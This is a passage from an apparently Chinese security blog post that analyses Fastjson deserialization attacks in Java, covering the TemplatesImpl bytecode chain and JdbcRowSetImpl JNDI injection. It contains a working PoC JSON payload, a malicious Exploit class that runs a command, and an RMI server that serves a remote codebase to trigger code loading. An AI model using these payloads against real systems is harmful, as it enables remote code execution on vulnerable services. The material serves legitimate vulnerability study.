AABgABAAAAIQAPAAAABAABABkACQAaABsAAgANAAAAJQACAAIAAAAJuwAGWbcAB0yxAAAAAQAOAAAACgACAAAAJQAIACYADwAAAAQAAQAQAAEAHAAAAAIAHQ==\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; ],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_name\&quot;: \&quot;aaa\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">        JSON.parse(str,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="浅析："><a href="#浅析：" class="headerlink" title="浅析："></a>浅析：</h6><blockquote>
<p>前面一大段和前面分析反序列化源码的时候一样，重复的就不解析了</p>
</blockquote>
<p>在<code>JavaBeanDeserializer#deserialize</code>中在解析属性的时候跟进到<code>JavaBeanDeserializer#parseField</code>和<code>JavaBeanDeserializer#smartMatch</code></p>
<p>之后在<code>DefaultFieldDeserializer#parseField</code>中对<code>_bytecodes</code>进行base64解密</p>
<p><img src="https://img-blog.csdnimg.cn/597a84db5f024e6db460b1fec5357385.png" alt="img"></p>
<p>当key为<code>_outputPropertie</code>时，因为变量名和数组中的名字不匹配，使得获取这个Filed的deserializer的时候会返回null</p>
<p><img src="https://img-blog.csdnimg.cn/a3e530b24dbc4fb59bdc8e1f271f59bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>在后面对属性名进行判断将<code>_|-</code>删掉，因为在获取属性名的时候，一开始也是从<code>get|set</code>后面截取，再此进去<code>getFieldDeserializer</code>，如果匹配到就返回该<code>FieldDeserializer    </code></p>
<p><img src="https://img-blog.csdnimg.cn/1bc1d4a3118247f887c3ac2abd70cb55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/3b627566363b4c5a83d9b906ec36afc1.png" alt="img"></p>
<p>之后在<code>setValue</code>中调用<code>TemplatesImpl#getOutputProperties</code></p>
<p><img src="https://img-blog.csdnimg.cn/78082511972746c297a9caca0f7eff10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<blockquote>
<p>之后就是之前在CC3 分析过的TemplatesImpl的链子 已知TemplatesImpl存在defineClass处理字节码 </p>
</blockquote>
<p>跟进到<code>TemplatesImpl#newTransformer</code>，在实例化<code>TransformerImpl</code>的时候调用到了<code>getTransletInstance</code>，然后在<code>defineTransletClasses</code>中调用了definClass来处理我们传进去的恶意类的字节码</p>
<p>实现恶意类的实例化</p>
<p><img src="https://img-blog.csdnimg.cn/c8db74e3c69849cea7fa72ac4605f641.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/e9ace8537345494fad16aae0cefea438.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="JNDI-JdbcRowSetImpl"><a href="#JNDI-JdbcRowSetImpl" class="headerlink" title="JNDI JdbcRowSetImpl"></a>JNDI JdbcRowSetImpl</h5><p>因为反序列化的时候会直接去调用类的get、set或者默认的构造方法，那么我们可以先简单地看一下这些方法</p>
<h6 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImpl</span> <span class="keyword">extends</span> <span class="title">BaseRowSet</span> <span class="keyword">implements</span> <span class="title">JdbcRowSet</span>, <span class="title">Joinable</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>默认的构造方法，大部分是set方法，实现变量的初始化，然后set和get也没有什么带有漏洞的，那么我们可以去看一下别的方法，就比如根据对JNDI的了解，实现JNDI注入客户端要能调用到lookup，然后我们传入带有恶意类的RMI URL或者LDAP URL就好了，那么就直接全局搜索<code>lookup</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JdbcRowSetImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.resBundle = JdbcRowSetResourceBundle.getJdbcRowSetResourceBundle();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(var10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.initParams();</span><br><span class="line"></span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.iMatchColumns = <span class="keyword">new</span> Vector(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> var1;</span><br><span class="line">    <span class="keyword">for</span>(var1 = <span class="number">0</span>; var1 &lt; <span class="number">10</span>; ++var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.iMatchColumns.add(var1, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.strMatchColumns = <span class="keyword">new</span> Vector(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(var1 = <span class="number">0</span>; var1 &lt; <span class="number">10</span>; ++var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.strMatchColumns.add(var1, (Object)<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以在<code>connect</code>那里发现<code>lookup</code>，然后传入的是<code>dataSource</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而再全局搜索一下<code>connect</code>，发现<code>getDatabaseMetaData</code>和<code>setAutoCommit</code>方法会自动调用<code>this.connect()</code>，不过这该怎么用就要看用<code>parse</code>还是<code>parseObject</code>进行反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/f355965f53514689a31278339992fc69.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/9ad8685baec44733ab56d2a2e03c93fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h6 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h6><p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">&quot;dataSourceName&quot;:&quot;rmi://ip:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><code>Exploit</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"> 	<span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	 <span class="keyword">try</span> &#123;</span><br><span class="line"> 		Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"> 	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"> 		e.printStackTrace();</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> 	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> 		Exploit exploit = <span class="keyword">new</span> Exploit();</span><br><span class="line"> 	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">		Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不知道为什么用vps和marshalsec会报错，但是jdk版本也是8u112，所以最后在本地自己开JNDI服务，然后用phpstudy开一个端口8000，然后运行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 提供服务 注册 将对象与对应的Name进行绑定</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.RegistryContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>FaIth4444师傅</p>
<p><a href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad#PYn7q">https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad#PYn7q</a></p>
<p><a href="https://blog.csdn.net/weixin_44687621/article/details/119947891">https://blog.csdn.net/weixin_44687621/article/details/119947891</a></p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
</search>
